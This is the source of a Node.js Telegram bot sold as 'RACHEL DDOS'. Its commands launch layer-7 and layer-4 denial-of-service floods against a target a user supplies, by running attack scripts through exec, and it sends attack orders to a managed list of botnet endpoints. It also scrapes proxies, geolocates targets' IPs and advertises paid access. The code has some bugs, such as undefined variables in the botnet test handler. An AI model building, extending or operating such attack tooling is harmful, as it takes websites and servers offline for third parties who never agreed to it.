const { exec } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const chalk = require('chalk');
const os = require('os');
const axios = require('axios');
const path = require('path');
const scrapeProxies = require('./proxy.js');
const settings = require('./settings.js'); // Import settings dari setting.js
const owner = settings.owner;
const adminfile = 'all/owner.json';
const premiumUsersFile = 'all/prem.json';
try {
    premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
} catch (error) {
    console.error('Error reading premiumUsers file:', error);
}
try {
    adminUsers = JSON.parse(fs.readFileSync(adminfile));
} catch (error) {
    console.error('Error reading adminUsers file:', error);
}

// Token bot Telegram kamu
const bot = new TelegramBot(settings.botToken, { polling: true });

// File untuk logging
const logFile = 'bot.log';

// Fungsi untuk menulis log ke file dan console
function logToFileAndConsole(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  console.log(logMessage);
  fs.appendFileSync(logFile, logMessage);
}

// Fungsi untuk memproses pesan dan mengirim ke API
const getAIResponse = async (message) => {
  try {
    const response = await axios.get(`https://api.agatz.xyz/api/blackboxAIChat?message=${encodeURIComponent(message)}&webSearchMode=true`);
    let pepek = await response.data
    return pepek.data; // Sesuaikan jika respon API berbeda format
  } catch (error) {
    console.error('Error fetching from AI API:', error);
    return 'Maaf, terjadi kesalahan saat menghubungi AI.';
  }
};

//Awal Dari dimulainya bot 
console.log(chalk.greenBright(' ===================================================='))
console.log(chalk.greenBright(' │ + Owner    : ' + settings.ownerName || ''))
console.log(chalk.greenBright(' │ + Version  : 2.1.5' || ''))
console.log(chalk.greenBright(' │ + Host     : ' + os.hostname() || ''))
console.log(chalk.greenBright(' │ + Platfrom : ' + os.platform() || ''))
console.log(chalk.greenBright(' ===================================================='))
console.log(chalk.whiteBright('╭─── [ LOG ]'))
 
// Mulai dengan scraping proxy saat bot dijalankan
scrapeProxies();

// Command /start untuk memunculkan contoh command
bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;

  // Kirim pesan awal
  bot.sendMessage(chatId, "TUNGGU SEBENTAR").then(sentMessage => {
    // Update pesan dengan ">Dirzz Bot<" setelah 1 detik
    setTimeout(() => {
      bot.editMessageText(">MEMUAT MENU<", {
        chat_id: chatId,
        message_id: sentMessage.message_id
      });

      // Update pesan dengan "V2.1.5" setelah 1 detik
      setTimeout(() => {
        bot.editMessageText(">RACHEL DDOS<\nV2.0.0", {
          chat_id: chatId,
          message_id: sentMessage.message_id
        });

        // Update pesan dengan daftar perintah setelah 1 detik
        setTimeout(() => {
          const message = `>RACHEL DDOS<\nV2.0.0

Hello Welcome To RACHEL BOT DDOS!!

⁉️Use This Bot Wisely And Don't Harm Other Parties

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

*📡Below Is Our Main Menu:*
/methods [ Showing DDoS Method ]
/botnetmethods [ Showing DDoS Method BOTNET ]

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

*🌐The Following Is Our Additional Menu:*
/info [ Displays Complete web information ]
/owner [ Contact My Owner ]
/cekip [ To view ip information ]

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

👻Update Command
/upproxy [ Update This Proxy ]
/proxycount [ Melihat Data Proxy ]
/uacount [ Melihat Data User Agents ]

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

⭕ Owner Command
/addprem
/delprem
/addown
/delown

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

⁉️DDoS Bot Simple By Rachel 🔥`;

          bot.editMessageText(message, {
            chat_id: chatId,
            message_id: sentMessage.message_id
          });

          // Tambahkan button setelah 1 detik
          setTimeout(() => {
            const options = {
              reply_markup: {
                inline_keyboard: [
                  [{ text: "Hubungi Admin", url: "https://t.me/Rachel_host" }]
                ]
              }
            };

            bot.editMessageReplyMarkup(options.reply_markup, {
              chat_id: chatId,
              message_id: sentMessage.message_id
            });

            logToFileAndConsole(`Send /menu message in chat ${chatId}`);
          }, 1000); // 1000 ms = 1 second delay
          
        }, 1000); // 1000 ms = 1 second delay
      }, 1000); // 1000 ms = 1 second delay
    }, 1000); // 1000 ms = 1 second delay
  });
});

// Command /updateproxy untuk memperbarui proxy
bot.onText(/\/updateproxy/, (msg) => {
  const chatId = msg.chat.id;
  const adminUsers = JSON.parse(fs.readFileSync(adminfile));
  const isAdmin = adminUsers.includes(String(msg.from.id));  
  if (!isAdmin) return bot.sendMessage(chatId, 'Kamu siapa? Mau buy sc dm @Rachel_host');

  // Kirim pesan awal
  bot.sendMessage(chatId, "Updating proxy...").then(sentMessage => {
    // Tunggu 5 detik (5000 ms) sebelum mengubah pesan
    setTimeout(() => {
      // Panggil fungsi untuk memperbarui proxy
      scrapeProxies();

      // Ubah pesan menjadi "Proxy updated successfully"
      bot.editMessageText("Proxy updated successfully", {
        chat_id: chatId,
        message_id: sentMessage.message_id
      });

      logToFileAndConsole(`Updated /updateproxy message in chat ${chatId}`);
    }, 5000); // 5000 ms = 5 seconds delay
  });
}); 

// Command /method untuk menunjukkan metode yang tersedia
bot.onText(/\/methods/, (msg) => {
  const chatId = msg.chat.id;
  
  // Kirim pesan awal
  bot.sendMessage(chatId, "MEMUAT METHODS BIASA").then(sentMessage => {
    // Tambahkan delay 3 detik (3000 ms) sebelum mengedit pesan
    setTimeout(() => {
      let message = `≡ 𒄆DDoS Method Layer 7🪽
┌─⊷
 |- panel
 |- tls
 |- glory
 |- good
└───────────
[🔎] /ddos [methods] [url] [duration]
Example: /ddos flood https://example.com 60`

      // Edit pesan yang sudah dikirim
      bot.editMessageText(message, {
        chat_id: chatId,
        message_id: sentMessage.message_id
      });
      
      logToFileAndConsole(`Updated /methods message in chat ${chatId}`);
    }, 2000); // 3000 ms = 3 seconds delay
  });
});


// Command /attack untuk meluncurkan perintah di VPS
bot.onText(/\/ddos (.+) (.+) (.+)(?: (.+))?/, async (msg, match) => {
const chatId = msg.chat.id;

  const method = match[1]; // Ambil method dari command
  const target = match[2]; // Ambil target dari command
  const duration = match[3]; // Ambil times dari command
  let command;

  try {
    const parsedUrl = new URL(target);
    const hostname = parsedUrl.hostname;

    // Mengambil data dari IP-API
    const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const result = response.data;

    const deepinfo = `*Isp:* ${result.isp}\n*Ip:* ${result.query}\n*AS:* ${result.as}\n*Start Time:* ${new Date().toLocaleString()}\n*Running Attacks:* 1/1\n➖➖➖➖➖➖➖➖➖➖\n*Owner : ( @Rachel_host )*\n*Power-Proof : ( @Rachel_host power )*`;

    // Switch case untuk menentukan perintah yang dijalankan
    switch (method) {
      case 'tls':
        command = `node tls.js ${target} ${duration} 100 10`;
        break;
      case 'panel':
        command = `node panel.js ${target} ${duration}`;
        break;
        case 'glory':
        command = `node glory.js ${target} ${duration} 100 10 proxy.txt`;
        break;
        case 'good':
        command = `node good.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      default:
        bot.sendMessage(chatId, "Metode tidak dikenali atau format salah. Gunakan /methods untuk melihat metode yang tersedia.");
        return;
    }

    // Log ke file dan console
    logToFileAndConsole(`Received /ddos command from chat ${chatId}. Executing: ${command}`);

    // Kirim pesan bahwa attack telah diluncurkan
    bot.sendMessage(chatId, `\`\`\`DDOS-ATTACK Command Executed!\nTarget: ${target}\nDuration: ${duration}\nMethod: ${method}\n${deepinfo} \`\`\``, { parse_mode: 'Markdown' });

    // Eksekusi command
    exec(command, (error, stdout, stderr) => {
      if (error) {
        const errorMessage = `Error: ${error.message}\nStderr: ${stderr}`;
        logToFileAndConsole(chatId, errorMessage);
        logToFileAndConsole(`Execution error for chat ${chatId}: ${errorMessage}`);
        return;
      }
      if (stderr) {
        const stderrMessage = `Stderr: ${stderr}`;
        logToFileAndConsole(chatId, stderrMessage);
        logToFileAndConsole(`Execution stderr for chat ${chatId}: ${stderr}`);
        return;
      }
      const successMessage = `Command sukses dijalankan! Output:\n${stdout}`;
      logToFileAndConsole(chatId, successMessage);
      logToFileAndConsole(`Command executed successfully for chat ${chatId}. Output: ${stdout}`);
    });
  } catch (error) {
    bot.sendMessage(chatId, "Terjadi kesalahan saat mengambil data target atau menjalankan perintah.");
    logToFileAndConsole(`Error occurred for chat ${chatId}: ${error.message}`);
  }
});

bot.onText(/\/layer4 (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const adminUsers = JSON.parse(fs.readFileSync(adminfile));
  const isAdmin = adminUsers.includes(String(msg.from.id));  
  if (!isAdmin) return bot.sendMessage(chatId, 'Kamu siapa? Mau buy sc dm @FLAYINGSORYOU');
  const method = match[1]; // Ambil method dari command
  const target = match[2]; // Ambil target dari command
  const duration = match[3]; // Ambil duration dari command
  const port = match[4] || ''; // Ambil port dari command
  let command;

  switch (method) {
    case 'udp':
      command = `node udp.js ${target} ${port} ${duration}`;
      break;
    case 'kill-vps':
      exec(`node StarsXSSH.js ${target} 22 root ${duration}`)
      exec(`node flood.js https://${target} ${duration}`)
      exec(`node raw.js http://${target} ${duration}`)
      break;
    case 'tcp':
      command = `node tcp.js ${target} ${port} ${duration}`
      break;
    case 'dns':
      command = `node dns.js ${target} ${port} ${duration}`
      break;
    case 'ntp':
      command = `node ntp.js ${target} ${port} ${duration}`
      break;
    case 'ovh':
      command = `node ovh.js ${target} ${port} ${duration}`
      break;
    case 'spampair':
      command = `node lib/spampair.js ${target} ${duration}`
      break;
    default:
      bot.sendMessage(chatId, "Metode tidak dikenali atau format salah. Gunakan /method untuk melihat metode yang tersedia.");
      return;
  }
  logToFileAndConsole(`Received /stress command from chat ${chatId}. Executing: ${command}`);
  // Kirim pesan bahwa attack telah diluncurkan
  bot.sendMessage(chatId, `\`\`\`Attack Attack launched!\nTarget: ${target}\nDuration: ${duration}\nMethod: ${method}\nPort: ${port}\`\`\``, { parse_mode: 'Markdown' })
  
  exec(command, (error, stdout, stderr) => {
    if (error) {
      const errorMessage = `Error: ${error.message}\nStderr: ${stderr}`;
      bot.sendMessage(chatId, errorMessage);
      logToFileAndConsole(`Execution error for chat ${chatId}: ${errorMessage}`);
      return;
    }
    if (stderr) {
      const stderrMessage = `Stderr: ${stderr}`;
      bot.sendMessage(chatId, stderrMessage);
      logToFileAndConsole(`Execution stderr for chat ${chatId}: ${stderr}`);
      return;
    }
    const successMessage = `Command sukses dijalankan! Output:\n${stdout}`;
    bot.sendMessage(chatId, successMessage);
    logToFileAndConsole(`Command executed successfully for chat ${chatId}. Output: ${stdout}`);
  });
});
// Handler untuk command /proxycount
bot.onText(/\/proxycount/, (msg) => {
  const chatId = msg.chat.id;
  const adminUsers = JSON.parse(fs.readFileSync(adminfile));
  const isAdmin = adminUsers.includes(String(msg.from.id));  
  if (!isAdmin) return bot.sendMessage(chatId, 'Kamu siapa? Mau buy sc dm @Rachel_host');

  fs.readFile('proxy.txt', 'utf8', (err, data) => {
    if (err) {
      bot.sendMessage(chatId, "Gagal membaca file proxy.txt. Pastikan file tersebut ada dan bisa diakses.");
      logToFileAndConsole(`Error reading proxy.txt: ${err.message}`);
      return;
    }

    // Pisahkan setiap baris yang ada di file proxy.txt
    const proxies = data.split('\n').filter(Boolean);
    const proxyCount = proxies.length;

    bot.sendMessage(chatId, `Jumlah proxy yang ada di proxy.txt: ${proxyCount}`);
    logToFileAndConsole(`Sent proxy count: ${proxyCount} to chat ${chatId}`);
  });
});    
//Ua Count command
bot.onText(/\/uacount/, (msg) => {
  const chatId = msg.chat.id;
  const adminUsers = JSON.parse(fs.readFileSync(adminfile));
  const isAdmin = adminUsers.includes(String(msg.from.id));  
  if (!isAdmin) return bot.sendMessage(chatId, 'Kamu siapa? Mau buy sc dm @Rachel_host');

  fs.readFile('ua.txt', 'utf8', (err, data) => {
    if (err) {
      bot.sendMessage(chatId, "Gagal membaca file ua.txt. Pastikan file tersebut ada dan bisa diakses.");
      logToFileAndConsole(`Error reading ua.txt: ${err.message}`);
      return;
    }

    // Pisahkan setiap baris yang ada di file proxy.txt
    const proxies = data.split('\n').filter(Boolean);
    const uaCount = proxies.length;

    bot.sendMessage(chatId, `Jumlah User Agent yang ada di ua.txt: ${uaCount}`);
    logToFileAndConsole(`Sent ua count: ${uaCount} to chat ${chatId}`);
  });
});      
// Listener untuk command /ai
bot.onText(/\/ai (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userMessage = match[1];

  bot.sendMessage(chatId, 'Menghubungi Blackbox AI...');

  // Dapatkan respon dari API
  const aiResponse = await getAIResponse(userMessage);

  // Kirimkan hasil respon ke user
  bot.sendMessage(chatId, aiResponse);
});

//Tambah Premium
bot.onText(/\/addprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        if (!premiumUsers.includes(userId)) {
            premiumUsers.push(userId);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been added to premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is already a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

//Hapus Premium
bot.onText(/\/delprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];  
    if (msg.from.id.toString() === owner) {
        const index = premiumUsers.indexOf(userId);
        if (index !== -1) {
            premiumUsers.splice(index, 1);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been removed from premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is not a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

//Tambah Premium
bot.onText(/\/addown (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        if (!adminUsers.includes(userId)) {
            adminUsers.push(userId);
            fs.writeFileSync(adminUsersFile, JSON.stringify(adminUsers));
            bot.sendMessage(chatId, `User ${userId} has been added to owner users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is already a owner user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

//Hapus Premium
bot.onText(/\/delown (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];  
    if (msg.from.id.toString() === owner) {
        const index = adminUsers.indexOf(userId);
        if (index !== -1) {
            adminUsers.splice(index, 1);
            fs.writeFileSync(adminUsersFile, JSON.stringify(adminUsers));
            bot.sendMessage(chatId, `User ${userId} has been removed from owner users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is not a owner user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

bot.onText(/\/botnetmethods/, (msg) => {
  const chatId = msg.chat.id;
  
  // Kirim pesan awal
  bot.sendMessage(chatId, "MEMUAT METHODS BOTNET").then(sentMessage => {
    // Tambahkan delay 3 detik (3000 ms) sebelum mengedit pesan
    setTimeout(() => {
      let message = `≡ 𒄆DDoS Method Layer 7🪽
┌─⊷
 |- flood
 |- tls
 |- https
 |- h2-corment
 |- h2-bursh
 |- h2-flash
└───────────`

 // Edit pesan yang sudah dikirim
      bot.editMessageText(message, {
        chat_id: chatId,
        message_id: sentMessage.message_id
      });
      
      logToFileAndConsole(`Updated /methods message in chat ${chatId}`);
    }, 2000); // 3000 ms = 3 seconds delay
  });
});

//Botnet
async function PermenMDBotnet(endpoints, target, duration, methods) {
    let successCount = 0;

    for (const endpoint of endpoints) {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
        try {
            const response = await axios.get(apiUrl);
            if (response.status === 200) {
                successCount++;
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    }

    return successCount;
}
function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}

bot.onText(/\/botnet(?:\s+(\S+))?(?:\s+(\S+))?(?:\s+(\S+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = msg.from.username;

    // Periksa jika kurang dari 3 argumen yang diberikan
    if (!match[1] || !match[2] || !match[3]) {
        return bot.sendMessage(chatId, '[🔎] Format: /botnet [target] [duration] [methods]\nExample: /botnet http://example.com 60 tls', { parse_mode: 'Markdown' });
    }

    bot.sendMessage(chatId, 'Wait A Seconds...');
   
    // Mendapatkan waktu saat serangan dimulai
    const startTime = new Date().toLocaleString();

    const [target, duration, methods] = [match[1].trim(), match[2].trim(), match[3].trim()];

    try {
        const parsedUrl = new URL(target);
        const hostname = parsedUrl.hostname;
        const path = parsedUrl.pathname;

        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = response.data;

        const deepinfo = `*Isp:* ${result.isp}\n*Ip:* ${result.query}\n*AS:* ${result.as}\n*Start Time:* ${startTime}\n*Running Attacks:* 1/1\n➖➖➖➖➖➖➖➖➖➖➖➖➖➖\n*Owner : (  @Rachel_host  )*\n*Power-Proof : (  @Rachel_host  )*`;
        const botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
        const endpoints = botnetData.endpoints;

        const successCount = await PermenMDBotnet(endpoints, target, duration, methods);

        bot.sendMessage(chatId, `*🔴 Attack Succesfully Sent To🔴*\n\n*Attack By:* @${username}\n*Target:* ${target}\n*Methods:* ${methods}\n*Duration:* ${duration} seconds\n${deepinfo}`, {
            parse_mode: 'Markdown',
            reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'CEK TARGET',
              url: `https://check-host.net/check-http?host=${target}`
            },
            {
              text: 'CHANNEL',
              url: `https://t.me/rachel_kawaii`
            }
          ],
          [
            {
              text: 'DEVELOPER',
              url: `https://t.me/Rachel_host`
            }
          ]
        ]
      },
            reply_to_message_id: msg.message_id,
        });

    } catch (error) {
        console.error(`Error: ${error.message}`);
        bot.sendMessage(chatId, '*[❗] Terjadi kesalahan saat mencoba mendapatkan informasi target.*', { parse_mode: 'Markdown' });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/addbotnet(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const text = match[1] ? match[1].trim() : '';  // Cek apakah ada argumen

    if (!text) {
        return bot.sendMessage(chatId, 'Usage: /addbotnet <endpoint>\nExample: /addbotnet http://123.123.123.123:1234/api/corment');
    }

    try {
        const parsedUrl = new URL(text);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/api/corment';
        const botnetData = loadBotnetData();

        if (botnetData.endpoints.includes(endpoint)) {
            return bot.sendMessage(chatId, `Endpoint ${endpoint} is already in the botnet list.`);
        }

        botnetData.endpoints.push(endpoint);
        saveBotnetData(botnetData);
        bot.sendMessage(chatId, `Endpoint ${endpoint} added to botnet.`);
    } catch (error) {
        bot.sendMessage(chatId, `Invalid URL: ${text}`);
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/testbotnet/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    bot.sendMessage(chatId, 'Wait A Second...');

    const botnetData = loadBotnetData();
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    const requests = botnetData.endpoints.map(async (endpoint) => {
    // Mengganti URL API sesuai dengan format baru
    const apiUrl = `${endpoint}&host=${target}&port=${port}&time=${duration}&method=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    saveBotnetData(botnetData);

    bot.sendMessage(chatId, `Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/listbotnet/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const botnetData = loadBotnetData();

    if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, 'Botnet list is empty.');
    }

    let response = '*Current Botnet:*\n';
    botnetData.endpoints.forEach((endpoint, index) => {
        response += `${index + 1}. ${endpoint}\n`;
    });

    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delbotnet (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const index = parseInt(match[1]) - 1;  // Konversi ke indeks array

    // Muat data botnet
    let botnetData;
    try {
        botnetData = loadBotnetData();
    } catch (error) {
        console.error('Error loading botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal memuat data botnet.*');
    }

    // Cek apakah array endpoints ada dan valid
    if (!Array.isArray(botnetData.endpoints)) {
        return bot.sendMessage(chatId, '*❌ Data endpoints tidak valid.*');
    }

    // Cek validitas indeks yang dimasukkan
    if (isNaN(index) || index < 1 || index >= botnetData.endpoints.length) {
        return bot.sendMessage(chatId, `Invalid index. Please provide a valid index from 1 to ${botnetData.endpoints.length}.`);
    }

    // Hapus endpoint yang sesuai
    botnetData.endpoints.splice(index, 1);

    // Simpan data botnet yang telah diperbarui
    try {
        saveBotnetData(botnetData);
    } catch (error) {
        console.error('Error saving botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal menyimpan perubahan data botnet.*');
    }

    bot.sendMessage(chatId, 'Botnet endpoint deleted successfully.');
});

bot.onText(/^\/info (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEBSITE
${web}

IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Failed to get information. Please try again later..');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'An error occurred while contacting the API.');
 });
});

bot.onText(/^(\.|\#|\/)cekip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /cekip <ip> ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
🌐 Creator : Rachel_host 
🔍 IP : ${data.query}
📊 Status : ${data.status}
🌍 Country : ${data.country}
🗺️ Country Code : ${data.countryCode}
🏞️ Region : ${data.region}
🏡 Region Name : ${data.regionName}
🏙️ City : ${data.city}
🏘️ District : ${data.district}
🏠 Zip : ${data.zip}
🌍 Latitude : ${data.lat}
🌍 Longitude : ${data.lon}
⏰ Timezone : ${data.timezone}
📶 ISP : ${data.isp}
🏢 Organization : ${data.org}
🌐 AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
        }
    });
    
    bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'INFORMATION',
          url: 'https://t.me/Trinity_general_familly'
        },
        {
          text: 'DEVELOPER',
          url: 'https://t.me/Rachel_host'
        },
        {
          text: 'CHANNEL',
          url: 'https://t.me/rachel_kawaii'
        }
      ];
      bot.sendMessage(chatId, `Hello guys ${name}, You can contact my owner here`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
//End

//Spam Pairing 

// Command /ongoing untuk mengecek command yang sedang berjalan
bot.onText(/\/ongoing/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "Tidak ada command yang sedang berjalan.");
  logToFileAndConsole(`Checked ongoing commands for chat ${chatId}`);
});